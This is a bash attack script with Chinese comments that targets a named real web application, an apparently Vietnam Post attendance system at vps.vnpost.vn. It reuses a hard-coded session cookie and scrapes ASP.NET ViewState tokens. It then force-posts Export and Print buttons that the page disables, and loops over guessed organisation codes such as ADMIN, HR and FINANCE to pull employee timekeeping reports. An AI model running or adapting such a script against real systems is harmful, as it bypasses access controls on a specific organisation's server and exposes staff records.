#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 死磕策略2: 绕过前端disabled限制"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "[1] 获取最新ViewState..."
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VIEWGEN=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EVENTVAL=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "  ViewState: ${VIEWSTATE:0:50}..."
echo "  ViewStateGen: $VIEWGEN"
echo "  EventVal: ${EVENTVAL:0:50}..."

echo -e "\n[2] 强制POST Export（忽略disabled）..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "__EVENTTARGET=" \
    --data-urlencode "__EVENTARGUMENT=" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
    --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "ListDV=" \
    --data-urlencode "ListBP=" \
    --data-urlencode "ListTO=" \
    --data-urlencode "btnExport=Export" \
    -o force_export_response.html 2>&1

size=$(wc -c < force_export_response.html)
echo "  响应大小: $size bytes"

if [ $size -gt 10000 ]; then
    echo "  🔥 可能成功! 大响应!"
    file force_export_response.html
elif grep -qi "excel\|xls\|application" force_export_response.html; then
    echo "  ✅ Excel文件!"
elif grep -qi "success\|complete\|download" force_export_response.html; then
    echo "  ✅ 导出成功!"
else
    echo "  ⚠️  检查响应:"
    head -50 force_export_response.html
fi

echo -e "\n[3] 测试btnIn（打印）..."
curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
    --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnIn=In" \
    -o force_print_response.html 2>&1

size=$(wc -c < force_print_response.html)
echo "  响应大小: $size bytes"

if [ $size -gt 10000 ]; then
    echo "  🔥 可能成功!"
    head -50 force_print_response.html
fi

echo -e "\n[4] 测试下拉框选项（强制填充）..."
# 尝试常见组织代码
for dv in "01" "02" "ADMIN" "HR" "IT" "FINANCE"; do
    echo -n "  ListDV=$dv: "
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "ListDV=$dv" \
        --data-urlencode "btnExport=Export" \
        -o "test_dv_${dv}.html" 2>&1
    
    size=$(wc -c < "test_dv_${dv}.html")
    if [ $size -ne 4205 ]; then
        echo "✅ 异常: $size bytes"
    else
        echo "-"
    fi
done

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 结果文件:"
ls -lh force_*.html test_dv_*.html 2>/dev/null
